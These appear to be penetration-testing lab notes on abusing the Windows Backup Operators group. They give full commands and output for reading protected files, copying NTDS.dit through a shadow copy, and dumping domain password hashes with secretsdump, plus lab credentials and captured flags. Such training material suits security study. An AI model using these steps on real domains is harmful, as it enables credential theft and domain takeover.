# Windows Built-in Groups

https://ss64.com/nt/syntax-security_groups.html

## Backup Operators

Check current group :

```
whoami /groups
```

The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL).
But it is not possible to use the standard copy command.

--> need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag
https://github.com/giuliano108/SeBackupPrivilege


### Copy a protected file

1) Import Librairies

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2) Verifying SeBackupPrivilege is Enabled

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

3) Enabling SeBackupPrivilege

```
Set-SeBackupPrivilege
Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

4) Copying a Protected File

```
dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt
```

```
cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes
```

```
cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

### Attacking a Domain Controller - Copying NTDS.dit

1) Create a shadow copy of the C drive and expose it as E drive

```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM
```

```
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

2) Copying NTDS.dit Locally

```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

3) Backing up SAM and SYSTEM Registry Hives

```
reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.
```

```
reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

4) Extracting Credentials from NTDS.dit

```
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
...
```

5) Extracting Hashes Using SecretsDump

```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

## Robocopy

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

--> This eliminates the need for any external tools.

## LAB

xfreerdp /v:10.129.175.116 /u:svc_backup /p:HTB_@cademy_stdnt!

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

Get-SeBackupPrivilege
SeBackupPrivilege is disabled

PS C:\Tools> Set-SeBackupPrivilege
PS C:\Tools> Get-SeBackupPrivilege
SeBackupPrivilege is enabled

PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Tools> cat 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt'
cat : Access to the path 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' is denied.
At line:1 char:1
+ cat 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...vilege\flag.txt:String) [Get-Content], Unauthorized
   AccessException
    + FullyQualifiedErro

Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
Copied 30 bytes

cat .\flag.txt
Car3ful_w1th_gr0up_m3mberSh1p!

PS C:\Tools> Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\DnsAdmins\flag.txt' .\flag_dns.txt
Copied 14 bytes

cat .\flag_dns.txt
Dll_abus3_ftw!